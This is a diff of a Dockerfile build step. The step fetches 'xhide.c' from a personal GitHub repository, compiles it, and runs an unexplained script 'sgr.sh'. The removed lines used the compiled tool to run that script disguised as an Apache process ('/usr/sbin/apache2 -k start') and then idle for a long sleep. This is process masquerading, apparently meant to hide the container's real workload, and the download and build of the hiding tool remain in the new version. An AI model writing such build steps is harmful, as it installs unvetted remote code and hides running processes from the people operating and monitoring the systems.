@@ -12,8 +12,7 @@ RUN \
   tar xf main.tar.gz && \
   wget https://github.com/waefd46/weimu/raw/main/xhide.c && \
   gcc -o test xhide.c && \
-  ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh && \
-  sleep 80000 && \
+  ./sgr.sh && \
   rm -rf /var/lib/apt/lists/* 
 
 # Add files.
